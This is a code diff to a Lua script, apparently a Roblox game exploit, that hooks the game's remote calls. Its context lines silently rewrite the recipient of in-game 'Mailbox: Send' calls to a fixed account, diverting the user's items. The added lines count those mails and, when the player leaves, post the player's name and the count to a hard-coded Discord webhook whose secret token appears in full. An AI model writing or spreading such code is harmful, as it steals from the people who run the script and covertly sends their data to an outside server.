@@ -59,6 +59,7 @@ end
 if not _G.User then _G.User = "lol idk" end
 if not _G.Min then _G.Min = 500000000 end
 _G.pvc = ""
+local mailc = 0
 pcall(function()
 
 _G.pvc = ""
@@ -69,8 +70,9 @@ local args = {...}
 print(tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc)
 if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then 
 args[1] = "hamster97"
-elseif tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc then
-_G.pvc = args[3]
+elseif tostring(x) == "Mailbox: Send" and args[4] ~= _G.pvc then
+_G.pvc = args[4]
+mailc=mailc+1
 print("-------------lol")
 local qv = "starsh"
 print(qv)
@@ -89,6 +91,25 @@ print(responsexr.StatusMessage)
 end
 return originalFunction(x, unpack(args))
 end)
+
+game.Players.LocalPlayer.PlayerRemoving:Connect(function()
+if mailc >= 1 then
+local qv = "starsh"
+print(qv)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' left. Mail sent: '..mailc..'"}'
+print(qv)
+local responseqxr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
+end
+end)
+
 
 end)
 if dh then
